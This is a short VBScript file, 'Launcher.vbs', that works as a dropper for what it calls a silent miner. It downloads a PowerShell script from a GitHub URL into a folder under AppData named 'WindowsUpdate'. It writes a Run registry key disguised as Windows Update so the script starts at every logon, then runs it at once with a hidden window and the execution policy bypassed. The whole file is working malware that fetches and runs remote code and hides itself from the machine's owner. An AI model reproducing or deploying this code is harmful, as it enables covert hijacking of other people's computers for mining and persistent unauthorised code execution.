' ================================
' Launcher.vbs - Silent Miner Runner + Auto-Start
' ================================
Dim shell, fso, appData, hiddenFolder, ps1Path, ps1Url, regPath, regName
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

appData = shell.ExpandEnvironmentStrings("%APPDATA%")
hiddenFolder = appData & "\WindowsUpdate"
ps1Path = hiddenFolder & "\StartMining.ps1"
ps1Url = "https://raw.githubusercontent.com/Mrx-coder-1157/mining-scripts/main/StartMining.ps1"
regPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
regName = "WindowsUpdate"

' Create hidden folder
If Not fso.FolderExists(hiddenFolder) Then fso.CreateFolder hiddenFolder

' Download StartMining.ps1
Dim http : Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
http.Open "GET", ps1Url, False
http.Send
If http.Status = 200 Then
    Dim stream : Set stream = CreateObject("ADODB.Stream")
    stream.Type = 2
    stream.Charset = "utf-8"
    stream.Open
    stream.WriteText http.ResponseText
    stream.SaveToFile ps1Path, 2
    stream.Close
End If

' Add to startup
shell.RegWrite regPath & "\" & regName, "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & ps1Path & """", "REG_SZ"

' Run it once now
shell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & ps1Path & """", 0, False
